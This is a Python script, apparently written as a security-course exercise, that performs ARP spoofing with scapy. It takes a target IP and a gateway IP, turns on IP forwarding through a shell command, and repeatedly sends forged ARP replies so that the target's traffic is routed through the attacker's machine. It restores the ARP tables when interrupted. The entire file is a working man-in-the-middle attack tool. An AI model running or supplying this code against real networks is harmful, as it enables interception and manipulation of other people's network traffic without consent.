#!/usr/bin/env python3
# @Author - Avish Dhirawat
# Date - 11 July 2020

import scapy.all as scapy
import time
import sys
import subprocess
import argparse

def get_arguments(): # Function to get arguments in command line
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', dest = "target_ip", help = "IP of the target computer")
    parser.add_argument('-g', '--gateway', dest = "gateway_ip", help = "IP of the gateway, use 'route -n' to find it out")
    options = parser.parse_args()
    if not options.target_ip:
        parser.error("[-] Please specify the target IP to spoof, use --help for more info")
    elif not options.gateway_ip:
        parser.error("[-] Please specify the gateway IP, use --help for more info")
    else:
        return options

def get_mac(ip): # Copied the scan function from the netword_scanner.py file and named it get_mac
    arp_request = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout = 1, verbose = False)[0]
    #print(answered_list.show())

    return answered_list[0][1].hwsrc
    #print(answered_list[0][1].hwsrc)
    #clients_list = []
    #for element in answered_list:
        #client_dict = {"ip" : element[1].psrc, "MAC" : element[1].hwsrc}
        #clients_list.append(client_dict)
    #return clients_list

def spoof(target_ip, spoof_ip): # To spoof the target
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
    #print(packet.show())
    #print(packet.summary())
    scapy.send(packet, verbose = False)

sent_packets_count = 0

def restore(destination_ip, source_ip): # Restore the ARP Table to default
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
    #print(packet.show())
    #print(packet.summary())
    scapy.send(packet, count= 4, verbose = False)

#restore("10.0.2.4", "10.0.2.1")
options = get_arguments()
target_ip = options.target_ip
gateway_ip = options.gateway_ip
subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell = True) # Incase the requests are blocked by linux machine (echo 1 > /proc/sys/net/ipv4/ip_forward)
# Exception Handling
try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        #get_mac("10.0.2.1")
        sent_packets_count+=2
        #print("\r[+] Packets sent: "+ str(sent_packets_count)),    # Additional coma(,) for saving it into buffer
        #sys.stdout.flush()                                         # Both of the lines are used to print it on same line in python2
        print("\r[+] Packets sent: "+ str(sent_packets_count), end ="") # Printing in same line by overriting previous result in python3
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C ...... Restoring ARP tables........ Please wait.\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
